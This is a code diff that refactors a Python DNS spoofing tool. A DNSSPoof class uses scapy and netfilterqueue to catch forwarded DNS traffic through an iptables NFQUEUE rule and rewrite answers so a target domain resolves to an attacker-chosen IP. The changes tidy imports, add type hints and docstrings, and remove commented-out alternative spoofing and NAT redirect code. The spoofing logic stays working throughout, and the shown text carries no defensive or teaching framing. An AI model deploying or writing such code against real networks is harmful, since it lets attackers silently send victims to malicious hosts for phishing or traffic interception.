@@ -1,6 +1,7 @@
 import os
 import netfilterqueue
-from scapy.all import *
+import threading
+from scapy.all import IP, DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 
@@ -12,7 +13,7 @@ class DNSSPoof:
         self.device_name = device_name
         self.run = False
         
-    def __str__(self):
+    def __str__(self) -> str:
         return "DNSSPoof: target_ip: {}, target_domain: {}, spoof_ip: {}".format(self.target_ip, self.target_domain, self.spoof_ip)
     
     def process_packet(self, packet):
@@ -35,14 +36,6 @@ class DNSSPoof:
                     del scapy_packet[UDP].chksum
 
                 packet.set_payload(bytes(scapy_packet))
-
-                # ip = IP(src = scapy_packet[IP].dst, dst = scapy_packet[IP].src)
-                # udp = UDP(sport = scapy_packet[UDP].dport, dport = scapy_packet[UDP].sport)
-                # dns = DNS(id = scapy_packet[DNS].id, qr = 1, qd = scapy_packet[DNS].qd, an = DNSRR(rrname = scapy_packet[DNS].qd.qname, rdata = self.spoof_ip))
-                
-                # spoofed_packet = ip/udp/dns
-
-                # packet.set_payload(bytes(spoofed_packet))
         
         packet.accept()
         
@@ -54,17 +47,17 @@ class DNSSPoof:
             queue.bind(0, self.process_packet)
             queue.run()
 
-    # Starts the DNS spoofing
-    def start(self):
+    def start(self) -> threading.Thread:
+        """Starts the DNS spoofing"""
+
         print("[*] Starting DNS spoofing")
 
         self.__set_iptables()
 
-        #sniff(iface = self.device_name, filter = "udp and port 53", store = False, prn = self.spoof_packet)
-
         th = threading.Thread(target = self.__run)
         th.daemon = True
         th.start()
+
         print("[+] DNS spoofing started")
         return th
 
@@ -82,15 +75,9 @@ class DNSSPoof:
 
         print("[+] DNS spoofing stopped")
 
-    # Sets the iptables to redirect the DNS requests to the target IP
     def __set_iptables(self):
+        """Sets the iptables to redirect the DNS requests to the target IP"""
         os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
 
         #os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
         #os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
-
-        #os.system("iptables -t nat -A PREROUTING -i {} -p udp --dport 53 -j NFQUEUE --queue-num 1".format(self.device_name, self.target_ip))
-        #os.system("iptables -t nat -A PREROUTING -i {} -p tcp --dport 53 -j NFQUEUE --queue-num 1".format(self.device_name, self.target_ip))
-        #os.system("iptables -t nat -A PREROUTING -i {} -p udp --dport 53 -j DNAT --to-destination {}:53".format(self.device_name, self.target_ip))
-        #os.system("iptables -t nat -A PREROUTING -i {} -p tcp --dport 53 -j DNAT --to-destination {}:53".format(self.device_name, self.target_ip))
-        #os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
